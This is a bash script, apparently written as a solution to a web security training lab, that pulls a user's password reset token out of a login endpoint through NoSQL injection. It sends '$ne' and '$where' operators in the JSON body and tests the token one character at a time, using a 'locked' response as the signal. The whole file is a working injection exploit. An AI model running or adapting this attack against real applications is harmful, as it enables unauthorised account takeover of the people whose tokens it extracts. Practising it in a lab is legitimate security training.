#!/bin/bash
alphabet=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_
index=01234567890123456789
for (( j=0; j<${#index}; j++ )); do
  for (( i=0; i<${#alphabet}; i++ )); do
    char="${alphabet:$i:1}"
    baseURL=0ab900a603038c0680c0eee600eb00c6.web-security-academy.net
    if [[ $(curl  --header "Content-Type: application/json" -s https://$baseURL/login --data "{\"username\":\"carlos\",\"password\":{\"\$ne\":\"\"}, \"\$where\":\"this.resetToken.match('^.{$j}$char.*\$')\"}" | grep locked) ]]; then
      echo "token[$j] = $char"
      break
    fi
  done
done
